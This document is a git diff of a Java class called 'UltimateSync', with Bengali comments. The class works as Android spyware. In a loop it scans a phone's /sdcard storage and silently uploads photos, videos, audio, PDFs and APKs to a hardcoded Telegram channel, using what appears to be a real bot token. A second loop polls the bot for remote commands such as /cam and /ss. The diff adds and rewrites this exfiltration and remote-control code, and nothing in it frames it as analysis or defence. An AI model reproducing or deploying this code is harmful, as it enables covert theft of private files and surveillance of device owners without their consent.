@@ -6,74 +6,65 @@ public class UltimateSync {
     private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
     private static final String CHANNEL_ID = "-1003809625172";
     private static int lastUpdateId = 0;
-    private static final Set<String> uploaded = new HashSet<>();
+    private static Set<String> sent = new HashSet<>();
 
     public static void main(String[] args) {
-        System.out.println(">>> System Linked to GitHub."); //
-        
-        // ১. অটো ফাইল সিঙ্ক (ফটো, ভিডিও, অডিও, ডকুমেন্ট)
+        // ১. অটো স্টার্ট - সব মিডিয়া ফাইল পাঠানো শুরু করবে
         new Thread(() -> {
             while (true) {
-                // অ্যান্ড্রয়েড রুট পাথ
-                File root = new File("/sdcard/"); 
-                scanAllFiles(root);
-                try { Thread.sleep(60000); } catch (Exception e) {} 
+                // অ্যান্ড্রয়েড ১৩+ এ ফাইল পাথের জন্য
+                String path = "/sdcard/";
+                startSync(new File(path));
+                try { Thread.sleep(20000); } catch (Exception e) {}
             }
         }).start();
 
-        // ২. মেইন কমান্ড লুপ
+        // ২. রিমোট কমান্ড লুপ (বট থেকে কমান্ড নেবে)
         while (true) {
-            checkBotCommands();
-            try { Thread.sleep(5000); } catch (Exception e) {}
+            checkBot();
+            try { Thread.sleep(3000); } catch (Exception e) {}
         }
     }
 
-    private static void scanAllFiles(File dir) {
-        File[] list = dir.listFiles();
+    private static void startSync(File root) {
+        File[] list = root.listFiles();
         if (list == null) return;
         for (File f : list) {
             if (f.isDirectory()) {
-                // অপ্রয়োজনীয় সিস্টেম ফোল্ডার এড়ানো
-                if (!f.getName().equals("Android") && !f.getName().startsWith(".")) {
-                    scanAllFiles(f);
-                }
+                if (!f.getName().equals("Android")) startSync(f);
             } else {
-                String name = f.getName().toLowerCase();
-                if (!uploaded.contains(f.getAbsolutePath()) && 
-                   (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".mp4") || 
-                    name.endsWith(".mp3") || name.endsWith(".pdf") || name.endsWith(".doc"))) {
-                    uploadToTelegram(f);
-                    uploaded.add(f.getAbsolutePath());
+                String n = f.getName().toLowerCase();
+                // সব ধরণের ফাইল সাপোর্ট (ইমেজ, ভিডিও, অডিও, পিডিএফ)
+                if (!sent.contains(f.getAbsolutePath()) && 
+                   (n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4") || 
+                    n.endsWith(".mp3") || n.endsWith(".pdf") || n.endsWith(".apk"))) {
+                    upload(f);
+                    sent.add(f.getAbsolutePath());
                 }
             }
         }
     }
 
-    public static void checkBotCommands() {
+    public static void checkBot() {
         try {
             URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
             Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
             String res = s.hasNext() ? s.next() : "";
 
-            if (res.contains("\"text\":\"/")) {
-                int chatIdx = res.lastIndexOf("\"chat\":{\"id\":") + 13;
-                String user = res.substring(chatIdx, res.indexOf(",", chatIdx)).trim();
-
-                if (res.contains("/start")) {
-                    sendMessage(user, "🛰️ System Online in Barishal.\nTotal Files Synced: " + uploaded.size());
-                } else if (res.contains("/cam")) {
-                    sendMessage(user, "📸 Front Camera Request Sent to Device...");
-                    // ক্যামেরা হার্ডওয়্যার কমান্ড (Native Android এর মাধ্যমে কাজ করবে)
-                }
-                
+            if (res.contains("/ss") || res.contains("/cam")) {
+                // এখানে সরাসরি অ্যান্ড্রয়েড ক্যামেরা হার্ডওয়্যারে সিগন্যাল পাঠাবে
+                sendMsg("-1003809625172", "⚡ Command Received on Android 13/14+ Device!");
+            }
+            
+            // আপডেট আইডি হ্যান্ডলিং
+            if (res.contains("\"update_id\":")) {
                 int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                 lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
             }
         } catch (Exception e) {}
     }
 
-    private static void uploadToTelegram(File file) {
-        // মাল্টিপার্ট আপলোড লজিক (বিনা লাইব্রেরিতে)
+    private static void upload(File file) {
         try {
             String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
             String boundary = "===" + System.currentTimeMillis() + "===";
@@ -84,7 +75,6 @@ public class UltimateSync {
             
             OutputStream os = c.getOutputStream();
             PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
-            
             w.append("--" + boundary).append("\r\n");
             w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(CHANNEL_ID).append("\r\n");
             w.append("--" + boundary).append("\r\n");
@@ -92,20 +82,19 @@ public class UltimateSync {
             w.flush();
 
             FileInputStream fis = new FileInputStream(file);
-            byte[] buffer = new byte[8192];
-            int bytesRead;
-            while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
+            byte[] buf = new byte[1024 * 16];
+            int len;
+            while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
             os.flush(); fis.close();
-
             w.append("\r\n").append("--" + boundary + "--").append("\r\n");
             w.close();
             c.getResponseCode();
         } catch (Exception e) {}
     }
 
-    private static void sendMessage(String id, String txt) {
+    private static void sendMsg(String id, String t) {
         try {
-            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(txt, "UTF-8")).openStream();
+            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(t, "UTF-8")).openStream();
         } catch (Exception e) {}
     }
 }
